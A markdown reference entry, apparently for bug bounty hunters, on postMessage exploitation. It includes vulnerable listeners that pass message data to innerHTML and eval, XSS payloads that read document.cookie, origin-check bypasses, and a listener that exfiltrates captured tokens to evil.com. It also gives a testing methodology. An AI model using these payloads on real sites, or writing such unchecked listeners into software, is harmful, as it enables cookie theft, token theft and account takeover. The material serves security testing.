---
id: "postmessage-attacks"
title: "PostMessage Exploitation"
type: "technique"
category: "web-application"
subcategory: "client-side"
tags: ["postmessage", "cross-origin", "xss", "origin-bypass", "data-theft", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["xss", "cors-misconfiguration", "oauth-advanced"]
difficulty: "advanced"
updated: "2026-04-14"
---

# PostMessage Exploitation

## Why PostMessage Bugs Are High Value
postMessage enables cross-origin communication. Missing/weak origin validation = XSS, data theft, or account takeover. Microsoft CVE-2024-49038 (Copilot Studio) scored CVSS 9.3 from postMessage origin failure. $2k–$20k.

## Missing Origin Validation → XSS
```javascript
// VULNERABLE listener (no origin check):
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});
```
```html
<!-- Exploit: -->
<iframe id="v" src="https://target.com/page-with-listener"></iframe>
<script>
document.getElementById('v').onload = function() {
  this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
};
</script>
```

## indexOf() Origin Bypass
```javascript
// VULNERABLE: uses indexOf
if (e.origin.indexOf('trusted-site.com') > -1) { eval(e.data); }
```
```
Bypass: Register trusted-site.com.evil.com
Both contain the substring "trusted-site.com"
```

## Regex Bypass via search()
```javascript
// VULNERABLE: search() treats string as regex, dot = wildcard
if (e.origin.search('trusted.site.com') !== -1) { eval(e.data); }
```
```
Bypass: trustedXsite.com matches (. = any char in regex)
```

## Null Origin via Sandboxed Iframe
```html
<iframe sandbox="allow-scripts allow-popups" srcdoc="
  <script>
    var w = window.open('https://target.com/page');
    setTimeout(function(){ w.postMessage('payload', '*'); }, 2000);
  </script>
"></iframe>
```

## Stealing Data Sent with Wildcard Target
```javascript
// If target sends: parent.postMessage(token, '*')
```
```html
<iframe src="https://target.com/oauth-callback"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch('https://evil.com/log?data=' + encodeURIComponent(JSON.stringify(e.data)));
});
</script>
```

## Testing Methodology
1. DevTools → Sources → Event Listener Breakpoints → check "message"
2. Search JS for `addEventListener('message'` and `postMessage(`
3. Analyze origin validation (indexOf, includes, search, match, startsWith)
4. Check if event.data flows to dangerous sinks (innerHTML, eval, location)
5. Check if app sends sensitive data via postMessage('*')

## Tools
- PMForce (automated postMessage scanner)
- Burp DOM Invader
- Browser DevTools Event Listener Breakpoints
